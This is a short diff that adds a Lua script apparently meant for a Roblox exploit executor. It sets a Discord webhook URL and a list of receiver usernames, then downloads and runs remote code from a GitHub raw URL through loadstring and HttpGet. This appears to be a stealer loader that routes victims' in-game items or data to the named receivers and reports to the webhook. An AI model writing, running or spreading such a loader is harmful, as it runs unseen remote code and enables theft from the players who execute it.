@@ -1,0 +1,9 @@
+getgenv().WEBHOOK = "https://discord.com/api/webhooks/1477121568403619883/jTRqSz-0EXqOZ47Jn6hAotcR_y9atCB2tzgxULhQv569_QBWAz0W38x4IIZCCtE366Y_ "
+
+getgenv().RECEIVERS = {
+    "DI_ARIO123",
+    "DI_ARIO123",
+    "DI_ARIO123",
+}
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/platinww/CrustyAuto/refs/heads/main/etfb.lua"))()
